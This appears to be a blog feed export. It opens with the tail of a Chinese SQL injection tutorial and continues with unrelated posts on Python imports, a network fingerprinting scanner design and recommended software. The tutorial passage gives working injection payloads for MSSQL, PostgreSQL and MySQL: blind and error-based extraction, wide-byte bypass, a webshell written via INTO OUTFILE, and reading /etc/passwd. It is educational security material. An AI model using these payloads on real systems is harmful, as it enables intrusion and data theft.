<p>　　通过修改rownumber可以获得表名，图上的数据库名为Web，如果是其他表的那就不会一样了<br>　　同样用类似的方法可以获得字段<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://××××?ID=<span class="number">1</span>/**/</span><br><span class="line">And/**/(/**/select/**/top/**/<span class="number">1</span>/**/COLUMN_NAME/**/</span><br><span class="line">from(/**/select/**/row_number()/**/over(/**/order/**/by/**/ORDINAL_POSITION)/**/as/**/rownumber,</span><br><span class="line">*/**/from/**/Web.information_schema.columns/**/</span><br><span class="line"><span class="built_in">where</span>/**/TABLE_NAME=NCHAR(<span class="number">31649</span>)%<span class="number">2</span>bNCHAR(<span class="number">29702</span>)%<span class="number">2</span>bnchar(<span class="number">24080</span>)%<span class="number">2</span>bnchar(<span class="number">25143</span>))/**/A/**</span><br><span class="line">/<span class="built_in">where</span>/**/rownumber=<span class="number">2</span>)&gt;<span class="number">0</span></span><br></pre></td></tr></table></figure></p>
<p>　　%2b为＋号，由于表名是中文，就会出现上面的样子，不是中文就不会这样。</p>
<h3 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h3><p>　　在PostgreSQL下<br>　　PostgreSQL常用的自带函数有:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">union select datname from pg_database</span><br><span class="line">order by <span class="number">11</span>                                         <span class="comment">#猜字段</span></span><br><span class="line">and (select length(current_database())) between <span class="number">0</span>,<span class="number">30</span> 　　　　　　<span class="comment">#判断数据库长度</span></span><br><span class="line">and(select ascii(substr(current_database(),<span class="number">1</span>,<span class="number">1</span>))) between <span class="number">0</span>,<span class="number">64</span>　　<span class="comment">#判断数据库名的第１位是否是在０,64的ascii码之间。</span></span><br><span class="line">select relname from pg_<span class="built_in">stat</span>_user_tables <span class="built_in">limit</span> <span class="number">1</span> offset n;</span><br><span class="line">and(select count(*) from pg_<span class="built_in">stat</span>_user_tables) between <span class="number">0</span>,<span class="number">64</span>　　<span class="comment">#判断数据库表数</span></span><br><span class="line">and(select length(relname) from pg_<span class="built_in">stat</span>_user_tables <span class="built_in">limit</span> <span class="number">1</span> offset <span class="number">0</span>) between <span class="number">0</span>,<span class="number">64</span>　　<span class="comment">#判断数据库表第一个表的长度</span></span><br><span class="line">and(select ascii(substr(relname,<span class="number">1</span>,<span class="number">1</span>)) from pg_<span class="built_in">stat</span>_user_tables <span class="built_in">limit</span> <span class="number">1</span> offset <span class="number">0</span>) between <span class="number">0</span>,<span class="number">64</span>　　<span class="comment">#判断数据库第一张表的第一个字符</span></span><br></pre></td></tr></table></figure></p>
<p>　　相应的操作其实和MySQL的操作类似，也可以直接使用MySQL的方式得出相应的数据</p>
<h2 id="u6709_u56DE_u663E_u7684_u51FD_u6570_u9519_u8BEF_u63D0_u793A"><a href="#u6709_u56DE_u663E_u7684_u51FD_u6570_u9519_u8BEF_u63D0_u793A" class="headerlink" title="有回显的函数错误提示"></a>有回显的函数错误提示</h2><p>　　针对有函数回显，方式就会方便很多。可以通过union select 先得到应有的字段有多少个，如果不是数字型记得把数字换成null。union和union all的区别是,union会自动压缩多个结果集合中的重复结果，而union all则将所有的结果全部显示出来，不管是不是重复。此外猜字段的方式还可以用having ‘1’=’1’的方式来，通过错误提示，间接的得到表的属性字段。其他方式的话，自由发挥。<br>　　有时候的回显，并不是直接建立在可视化的模块的界面，而是只有SQL内置报错函数的时候，就需要使用另一种方式，比如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span> from (select count(*),concat(floor(rand(<span class="number">0</span>)*<span class="number">2</span>),(the code you put))a from information_schema.tables group by a)b</span><br></pre></td></tr></table></figure></p>
<p>　　这句话的思路是通过floor(rand(0)*2)可能出现1或０的状况在group的时候，会出错，就会直接显示出错的地方，从而显示相应的字段或者数据，使用时，常常会用到limit,当然这种方法也有局限性，比如不能使用update,select into,insert,load_file(),group_concat()等函数，所以使用的时候，就会有相应的限制。得出的错误，会在开头多出一个１，所以去掉就可以了。</p>
<h2 id="u65E0_u56DE_u663E_u7684_u51FD_u6570_u9519_u8BEF_u63D0_u793A"><a href="#u65E0_u56DE_u663E_u7684_u51FD_u6570_u9519_u8BEF_u63D0_u793A" class="headerlink" title="无回显的函数错误提示"></a>无回显的函数错误提示</h2><p>　　在没有回显的状态下如何判断存在注入，最直观的情况下，可以用benchmark等类似的延迟函数，看有没有延迟返回，来判断有没有执行SQL语句。<br>　　针对返回只有true和false的这种情况，可以通过构造一个判断，来猜表的相应的内容。<br>　　比如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and left(databse(),<span class="number">1</span>)=<span class="string">'1'</span>　　　　　　　　　　　　 <span class="comment">#猜数据库名的第一位是１</span></span><br><span class="line">and length(databse())=<span class="string">'1'</span>　　　　　　　　　　　   <span class="comment">#猜数据库名长度为１</span></span><br><span class="line">and substr(left(role,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=char(<span class="number">49</span>) %<span class="number">23</span>　　 　　　<span class="comment">#该表的role字段第一位为１,char(49)=1</span></span><br></pre></td></tr></table></figure></p>
<p>　　通过类似这些方式进行猜解。当然为了避免php的GPC函数，需要用到hex函数以及使用ascii码来绕过，比如上图中的３的示例。</p>
<h2 id="u52A0_u5BC6_u5F62_u5F0F"><a href="#u52A0_u5BC6_u5F62_u5F0F" class="headerlink" title="加密形式"></a>加密形式</h2><p>　　有些程序员会通过将查询的部分加密，然后传到服务器解密，然后进行查询。常见的方式有base64,以及其他的方式。这时候策略就会和之前一样，只不过，在构造的时候，多一部分编码就可以了。</p>
<h2 id="u5176_u4ED6_u5F62_u5F0F"><a href="#u5176_u4ED6_u5F62_u5F0F" class="headerlink" title="其他形式"></a>其他形式</h2><h3 id="u5BBD_u5B57_u8282_u6CE8_u5165"><a href="#u5BBD_u5B57_u8282_u6CE8_u5165" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>　　比如%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MYSQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗’，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。其实不仅仅是%df可以，其他附近还有一定领域的也可以，可以字节去查一下。</p>
<h2 id="u5E38_u7528_u51FD_u6570"><a href="#u5E38_u7528_u51FD_u6570" class="headerlink" title="常用函数"></a>常用函数</h2><p>　　MySQL常用的自带函数有:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">user()                               //显示数据库用户</span><br><span class="line">database()                      //当前数据库名</span><br><span class="line">version()                        //数据库版本</span><br><span class="line">concat()                          //联合数据</span><br><span class="line">group_concat()             //多组数据拼接</span><br><span class="line">hex()                                 //十六进制编码</span><br><span class="line">unhex()                             //十六进制解码</span><br><span class="line">load_file()                     //读取文件</span><br><span class="line">@@datadir                    //数据路径</span><br><span class="line">@@tmpdir                       //临时路径</span><br><span class="line">@@version                     //数据库版本</span><br></pre></td></tr></table></figure></p>
<p>　　其他的诸如 @@version_comment，@@version_compile_os，@@warning_count等可以自己去翻一下。<br>　　此外用到比如转换类型比如convert( using latin1),以及select file into outfile’/asd/a.a’可以自己去尝试。<br>　　MSSQL常用的自带函数有:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_name()                               //显示数据库名</span><br></pre></td></tr></table></figure></p>
<p>　　PostgreSQL常用的自带函数有:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">version()                               //显示数据库版本信息</span><br></pre></td></tr></table></figure></p>
<h2 id="shell_u7F16_u5199"><a href="#shell_u7F16_u5199" class="headerlink" title="shell编写"></a>shell编写</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create table <span class="built_in">test</span> (a text);</span><br><span class="line">insert into <span class="built_in">test</span>(a) values(<span class="string">'code that you print'</span>);</span><br><span class="line">select a from text into outfile <span class="string">'C://asd//a.php'</span></span><br><span class="line"><span class="comment">#读取文件操作</span></span><br><span class="line">create table <span class="built_in">test</span> (a text);</span><br><span class="line">insert into <span class="built_in">test</span>(a) values(load_file(<span class="string">'/etc/passwd'</span>));</span><br><span class="line">select a from <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<h2 id="u9884_u9632_u63AA_u65BD"><a href="#u9884_u9632_u63AA_u65BD" class="headerlink" title="预防措施"></a>预防措施</h2><p>　　如果只有int的参数，最好最后直接转换为int类型，这样就可以避免注入，此外针对一些特殊的函数符号进行过滤。其他的一部分，下次会继续讲解，包括绕过等一些方式。<br>当然因为篇幅的原因，很多东西没有延伸开来，如果有错误的话欢迎指正。</p>
]]></content>
      
        <categories>
            
            <category> Web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python 中常见的 import 模块的方法(总结)]]></title>
      <url>https://nanshihui.github.io/2016/01/18/python%20%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%20import%20%E6%A8%A1%E5%9D%97%E7%9A%84%E6%96%B9%E6%B3%95(%E6%80%BB%E7%BB%93)/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>在用python进行编程时，经常会使用第三方模块包。这种包我们可以通过 python setup install  进行安装后，通过 import XXX或from XXX import yyy 进行导入。不过如果是自己遍写的依赖包，又不想安装到 python 的相应目录，可以放到本目录里进行import进行调用；为了更清晰的理清程序之间的关系，例如我们会把这种包放到lib目录再调用。<br><a id="more"></a><p></p>
<h2 id="u540C_u7EA7_u76EE_u5F55_u4E0B_u7684_u8C03_u7528"><a href="#u540C_u7EA7_u76EE_u5F55_u4E0B_u7684_u8C03_u7528" class="headerlink" title="同级目录下的调用"></a>同级目录下的调用</h2><p>　　程序结构如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- src</span><br><span class="line">    |-- mod1.py</span><br><span class="line">    |-- <span class="built_in">test</span>1.py</span><br></pre></td></tr></table></figure>
<p>　　若在程序test1.py中导入模块mod1, 则直接使用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import mod1</span><br><span class="line">或</span><br><span class="line">from mod1 import *;y</span><br></pre></td></tr></table></figure>
<h2 id="u8C03_u7528_u5B50_u76EE_u5F55_u4E0B_u7684_u6A21_u5757"><a href="#u8C03_u7528_u5B50_u76EE_u5F55_u4E0B_u7684_u6A21_u5757" class="headerlink" title="调用子目录下的模块"></a>调用子目录下的模块</h2><p>　　程序结构如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- src</span><br><span class="line">    |-- mod1.py</span><br><span class="line">    |-- lib</span><br><span class="line">    |    |-- mod2.py</span><br><span class="line">    |-- <span class="built_in">test</span>1.py</span><br></pre></td></tr></table></figure>
<p>　　这时看到test1.py和lib目录（即mod2.py的父级目录），如果想在程序test1.py中导入模块mod2.py ，可以在lib件夹中建立空文件<strong>init</strong>.py文件(也可以在该文件中自定义输出模块接口)，然后使用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from lib.mod2 import *</span><br><span class="line">或</span><br><span class="line">import lib.mod2.</span><br></pre></td></tr></table></figure>
<h2 id="u8C03_u7528_u4E0A_u7EA7_u76EE_u5F55_u4E0B_u7684_u6587_u4EF6"><a href="#u8C03_u7528_u4E0A_u7EA7_u76EE_u5F55_u4E0B_u7684_u6587_u4EF6" class="headerlink" title="调用上级目录下的文件"></a>调用上级目录下的文件</h2><p>　　程序结构如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- src</span><br><span class="line">    |-- mod1.py</span><br><span class="line">    |-- lib</span><br><span class="line">    |    |-- mod2.py</span><br><span class="line">    |-- sub</span><br><span class="line">    |    |-- <span class="built_in">test</span>2.py</span><br></pre></td></tr></table></figure>
<p>　　这里想要实现test2.py调用mod1.py和mod2.py ，做法是我们先跳到src目录下面，直接可以调用mod1，然后在lib上当下建一个空文件<strong>init</strong>.py ，就可以像第二步调用子目录下的模块一样，通过import lib.mod2进行调用了。具体代码如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.path.append(<span class="string">".."</span>)</span><br><span class="line">import mod1</span><br><span class="line">import lib.mod2</span><br></pre></td></tr></table></figure>
<p>　　这些细碎的知识很琐碎，有时候到很后面的时候，会突然发现，前面有些只是都会忘了。因此就把这些记下来，方便查阅。</p>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
            <tag> import </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[如何构建一个网络空间指纹识别系统（一）]]></title>
      <url>https://nanshihui.github.io/2016/01/15/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>仅记录在开发过程中的思考和理解<p></p>
<h3 id="u5982_u4F55_u6784_u5EFA_u4E00_u4E2A_u7F51_u7EDC_u7A7A_u95F4_u6307_u7EB9_u7CFB_u7EDF"><a href="#u5982_u4F55_u6784_u5EFA_u4E00_u4E2A_u7F51_u7EDC_u7A7A_u95F4_u6307_u7EB9_u7CFB_u7EDF" class="headerlink" title="如何构建一个网络空间指纹系统"></a>如何构建一个网络空间指纹系统</h3><ul>
<li><strong>整体架构:</strong> 整体搭建的结构；</li>
<li><strong>任务调度:</strong> 怎样让多个扫描合理的去扫描而不错乱；</li>
<li><strong>扫描器构造:</strong> 使用哪些指纹库，如何写出适合自己的扫描器；</li>
<li><strong>存储归类:</strong> 怎么处理获得的凌乱的数据；</li>
<li><strong>攻击框架:</strong> 如何发现网站的表示，以及快速发现网络的漏洞；</li>
<li><strong>其他:</strong> 想改进的地方；</li>
</ul>
<a id="more"></a>
<h2 id="u5F15_u8A00"><a href="#u5F15_u8A00" class="headerlink" title="引言"></a>引言</h2><p>　　有不少人都看过网络空间指纹扫描的系统，用户只要轻轻的一点，就能检索出，自己要求组件的主机信息。有不少人也很好奇这是怎么实现的，同样我也是，于是自己就开始动手，因此也就有了下文。当然水平有限，有些地方表述不一定正确，如果有什么地方存在不足，欢迎指正。</p>
<h2 id="u6574_u4F53_u67B6_u6784"><a href="#u6574_u4F53_u67B6_u6784" class="headerlink" title="整体架构"></a>整体架构</h2><p>　　整体的架构主要分为调度框架、ES存储、UI呈现等模块。<br>　　然而最核心的部分（调度框架）可以简化为两个工人集群。一个是抓取信息部分，另一个是处理信息。其中一批量爬虫工负责从任务池中接收任务，并抓取信息。另一批专门负责处理。有点类似于生产者与消费者。要构建这么一个系统，我们只要多个线程就能解决。但是如果我们想要变成一个集群的话，那思路略有不同。<br>　　我们在服务器中，首先要提供一个接口，负责当前访问的工人分配任务。当工人接收到任务的时候，接着就去完成任务，等到任务做好后，将得到的数据，重新提交给服务器。由服务器负责，将数据存储起来。同样的思维，处理信息的工作群也是这样的思路。这样整个雏形就出来了。<br>　　为了提高访问的速度以及使得信息能快速得到反馈，我们可以把工人反馈的任务在存储到数据库的同时，也把用户频繁检索所对应的数据，存入redis。这样，用户在检索的时候，首先去redis里面查找，如果找不到的话，就会去数据库里面找，如果还是找不到的话，才创建一个任务，并让工人类去执行任务。<br>　　如果不熟悉这样的操作方式的话，类似的思路可以去参考一下scapy，他的整体框架也是两批爬虫，一批负责爬取，一批负责存储，或者处理。
　　</p>
<h2 id="u4EFB_u52A1_u8C03_u5EA6"><a href="#u4EFB_u52A1_u8C03_u5EA6" class="headerlink" title="任务调度"></a>任务调度</h2><p>　　任务调度常见的就是多线程/多进程,不过由于Python语言在多线程的实现上采用了全局锁,使得即使你采用多线程,也只能够在单核上跑.因此出现了多进程和协程的结合方式。常见的Python的调度框架有很多,如果你仔细去看的话,就会发现他们的实现方式有很多共同性,他们的整体逻辑就是一个队列和工人,然后根据需要处理完任务,是否返回其他操作。所以你也完全可以自己是定制一个适合自己的实现方式。</p>
<p>　　未完待续。。。</p>
]]></content>
      
        <categories>
            
            <category> Web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Nmap </tag>
            
            <tag> Python </tag>
            
            <tag> Zmap </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[自用 Windows 和 Mac 软件推荐]]></title>
      <url>https://nanshihui.github.io/2016/01/08/windows-mac-software/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>罗列自己正在使用的 Windows 和 Mac OS 软件，基本上都是同类中能较好满足个人需求的软件，作表记录，方便自己检索，也顺便推荐给大家。<p></p>
<h3 id="u8F6F_u4EF6_u5206_u7C7B_u8BF4_u660E"><a href="#u8F6F_u4EF6_u5206_u7C7B_u8BF4_u660E" class="headerlink" title="软件分类说明"></a>软件分类说明</h3><ul>
<li><strong>编程开发:</strong> 目前写代码用到的一些软件；</li>
<li><strong>网络应用:</strong> 依赖于网络运行的软件，比如浏览器，聊天软件，下载工具等；</li>
<li><strong>文档处理:</strong> 查看和处理 Word, Excel, PDF 等文档；</li>
<li><strong>影音图像:</strong> 查看和处理多媒体文件，比如看图，听歌，视频处理等；</li>
<li><strong>系统工具:</strong> 增强、个性化系统或者系统自带软件的功能，比如资源管理器增强，任务栏个性化等；</li>
<li><strong>应用软件:</strong> 不属于以上分类的软件；</li>
</ul>
<a id="more"></a>
<h3 id="u8868_u683C_u5185_u5BB9_u89E3_u91CA"><a href="#u8868_u683C_u5185_u5BB9_u89E3_u91CA" class="headerlink" title="表格内容解释"></a>表格内容解释</h3><ul>
<li>表格依次列出软件名字，开发商，系统，付费，备注，默认使用软件的最新版本。</li>
<li><strong>表头英文:</strong> 用不留空的英文单词表示，避免默认设置下表头被换行；</li>
<li><strong>系统栏打 √ :</strong> 主要在该系统下使用该软件，少数双系统下都频繁使用；</li>
<li><strong>系统栏标 — :</strong> 该软件不支持该系统；</li>
<li><strong>Free 免费栏 :</strong> 标 x 该软件为付费共享软件；标 — 表示提供免费版，但功能等有所限制。</li>
<li><strong>链接:</strong> 点击软件名字跳转到软件主页，点开发商跳转到对其介绍页面或者对应官网。</li>
<li><strong>Note 备注:</strong> 软件用途简单介绍</li>
</ul>
<h2 id="u7F16_u7A0B_u5F00_u53D1"><a href="#u7F16_u7A0B_u5F00_u53D1" class="headerlink" title="编程开发"></a>编程开发</h2><table>
<thead>
<tr>
<th style="text-align:center">-</th>
<th>SoftwareName</th>
<th>　　Developer　　</th>
<th style="text-align:center">Mac</th>
<th style="text-align:center">Win</th>
<th style="text-align:center">Free</th>
<th>　　　　Note　　　　</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td><a href="https://desktop.github.com/" target="_blank" rel="external">GitHub Desktop</a></td>
<td><a href="https://en.wikipedia.org/wiki/GitHub" target="_blank" rel="external">GitHub, Inc.</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>GitHub 桌面版</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td><a href="http://www.sublimetext.com/" target="_blank" rel="external">Sublime Text 3</a></td>
<td><a href="https://en.wikipedia.org/wiki/Sublime_Text" target="_blank" rel="external">Jon Skinner</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td>代码编辑器</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td><a href="http://brackets.io/" target="_blank" rel="external">Brackets</a></td>
<td><a href="http://is.gd/q5bGeJ" target="_blank" rel="external">Adobe Systems</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>Web 代码编辑器</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td><a href="https://kapeli.com/dash" target="_blank" rel="external">Dash</a></td>
<td><a href="https://kapeli.com/" target="_blank" rel="external">Kapeli</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>API Snippet 代码管理</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td><a href="http://www.theescapers.com/flux/" target="_blank" rel="external">Flux V</a></td>
<td><a href="http://www.theescapers.com/" target="_blank" rel="external">Escapers Ltd.</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>可视化网页开发</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td><a href="https://www.apachefriends.org/zh_cn/index.html" target="_blank" rel="external">XAMPP</a></td>
<td><a href="https://www.apachefriends.org" target="_blank" rel="external">Apache Friends</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>PHP 开发环境，本地 WordPress</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td><a href="http://www.git-scm.com/" target="_blank" rel="external">Git</a></td>
<td><a href="https://en.wikipedia.org/wiki/Linus_Torvalds" target="_blank" rel="external">Linus Torvalds</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>Distributed version control system</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td><a href="http://colorsnapper.com/" target="_blank" rel="external">ColorSnapper</a></td>
<td><a href="http://colorsnapper.com/" target="_blank" rel="external">Koolesache</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>屏幕取色器</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td><a href="https://nodejs.org/en/" target="_blank" rel="external">Node.js</a></td>
<td><a href="https://en.wikipedia.org/wiki/Node.js" target="_blank" rel="external">Joyent, Inc.</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>JavaScript runtime</td>
</tr>
</tbody>
</table>
<h2 id="u7F51_u7EDC_u5E94_u7528"><a href="#u7F51_u7EDC_u5E94_u7528" class="headerlink" title="网络应用"></a>网络应用</h2><table>
<thead>
<tr>
<th style="text-align:center">-</th>
<th>SoftwareName</th>
<th>　　Developer　　</th>
<th style="text-align:center">Mac</th>
<th style="text-align:center">Win</th>
<th style="text-align:center">Free</th>
<th>　　　　Note　　　　</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td><a href="http://www.google.com/chrome/" target="_blank" rel="external">Chrome</a></td>
<td><a href="http://baike.baidu.com/view/105.htm" target="_blank" rel="external">谷歌</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>主力浏览器，插件脚本扩展</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td><a href="http://im.qq.com/" target="_blank" rel="external">QQ</a></td>
<td><a href="http://baike.baidu.com/view/1591.htm" target="_blank" rel="external">腾讯</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td>万年隐身</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td><a href="http://shadowsocks.org/en/index.html" target="_blank" rel="external">ShadowsocksX</a></td>
<td><a href="https://github.com/clowwindy" target="_blank" rel="external">clowwindy</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>和FQ谐</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td><a href="http://mac.xunlei.com/app/" target="_blank" rel="external">Thunder Store</a></td>
<td><a href="http://baike.baidu.com/view/467578.htm" target="_blank" rel="external">迅雷网络</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>检查应用更新</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td><a href="http://wangwang.taobao.com/" target="_blank" rel="external">阿里旺旺</a></td>
<td><a href="http://baike.baidu.com/view/1247049.htm" target="_blank" rel="external">阿里巴巴集团</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>买买买</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td><a href="https://jianguoyun.com/" target="_blank" rel="external">坚果云</a></td>
<td><a href="http://baike.baidu.com/view/8051910.htm" target="_blank" rel="external">上海亦存网络</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td>文档同步，备用</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td><a href="http://dl.xunlei.com/" target="_blank" rel="external">迅雷</a></td>
<td><a href="http://baike.baidu.com/view/467578.htm" target="_blank" rel="external">迅雷网络</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td>极速版，离线下载和高速通道</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td><a href="http://www.flvcd.com/index.htm" target="_blank" rel="external">FLVCD 硕鼠</a></td>
<td></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>网络视频下载</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td><a href="http://weixin.qq.com/" target="_blank" rel="external">微信</a></td>
<td><a href="http://baike.baidu.com/view/1591.htm" target="_blank" rel="external">腾讯</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>聊胜于无</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td><a href="http://www.maxthon.cn/" target="_blank" rel="external">Maxthon 傲游</a></td>
<td><a href="http://www.maxthon.cn/company/" target="_blank" rel="external">傲游天下</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>备用</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td><a href="http://pan.baidu.com/disk/download/guanjia/" target="_blank" rel="external">百度云管家</a></td>
<td><a href="http://baike.baidu.com/view/262.htm" target="_blank" rel="external">百度</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td>搜集、分享资源</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td><a href="http://www.ad-safe.com/" target="_blank" rel="external">ADSafe 净网大师</a></td>
<td><a href="http://www.ad-safe.com/" target="_blank" rel="external">大摩网络</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>网页、视频广告屏蔽</td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td><a href="http://music.163.com/#/download" target="_blank" rel="external">网易云音乐</a></td>
<td><a href="http://baike.baidu.com/view/149363.htm" target="_blank" rel="external">网易公司</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center">—</td>
<td>看评论听歌，发现好歌</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td><a href="http://yunpan.360.cn/" target="_blank" rel="external">360云盘</a></td>
<td><a href="http://baike.baidu.com/view/1458023.htm" target="_blank" rel="external">奇虎360</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center">—</td>
<td>主力同步软件，容量足够，带历史版本，文件数量不限</td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td><a href="/www.teamviewer.com">TeamViewer</a></td>
<td><a href="https://en.wikipedia.org/wiki/TeamViewer" target="_blank" rel="external">TeamViewer GmbH</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>远程桌面控制</td>
</tr>
<tr>
<td style="text-align:center">16</td>
<td><a href="http://reederapp.com/mac/" target="_blank" rel="external">Reeder 3</a></td>
<td><a href="https://itunes.apple.com/us/app/reeder-3/id880001334?ls=1&amp;mt=12" target="_blank" rel="external">Silvio Rizzi</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>RSS 订阅</td>
</tr>
</tbody>
</table>
